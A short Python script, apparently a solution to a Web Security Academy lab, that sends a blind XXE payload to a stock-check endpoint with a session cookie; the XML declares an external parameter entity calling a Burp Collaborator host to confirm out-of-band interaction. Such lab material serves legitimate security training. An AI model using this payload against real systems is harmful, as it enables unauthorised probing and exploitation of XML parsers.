import requests

url = "https://0a1f00880496e9a6c07026c0004d0041.web-security-academy.net/product/stock"

cookies = {
	"session": "7ZhwBZvjg1dcHpkP7I2sCTjkq7sCddDQ"
}

payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
	<!ENTITY % xxe SYSTEM "http://0efjv962njsv7bgcusg5peiu7ldc11.burpcollaborator.net">
	%xxe;
]>
<stockCheck>
<productId>1</productId>
<storeId>1</storeId>
</stockCheck>"""

r = requests.post(url, data=payload, cookies=cookies)

print(r.text)